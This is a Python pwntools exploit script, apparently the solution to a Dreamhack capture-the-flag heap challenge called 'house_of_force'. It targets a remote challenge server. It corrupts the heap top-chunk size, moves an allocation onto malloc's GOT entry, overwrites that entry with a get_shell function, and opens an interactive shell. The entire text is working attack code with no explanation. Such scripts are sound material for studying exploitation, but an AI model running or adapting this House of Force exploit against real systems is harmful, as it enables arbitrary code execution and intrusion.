#!/usr/bin/env python3
from pwn import *

exe = ELF('house_of_force', checksec = False)
p = remote('host8.dreamhack.games', 11918)
# p = process(exe.path)

def create(size, data):
	p.sendlineafter("> ","1")
	p.sendlineafter("Size: ",str(size))
	p.sendlineafter("Data: ",data)

def write_ptr(ptr, index, value):
	p.sendlineafter("> ", "2")
	p.sendlineafter("ptr idx: ", str(ptr))
	p.sendlineafter("write idx: ", str(index))
	p.sendlineafter("value: ", str(value))

get_shell = exe.symbols['get_shell']
target = exe.got['malloc'] #target

#top_chunk_address
create(0x10, "A"*0x10)
top_chunk = int(p.recv(9), 16) + 5*4
#change
write_ptr(0, 5, 0xffffffff)

size = target - top_chunk - 0x8
print(hex(size))

create(size, "A"*size)
#gdb.attach(p)

create(4, p32(get_shell))
p.sendlineafter("> ", '1')
p.sendlineafter("Size: ", str(0x10))

p.interactive()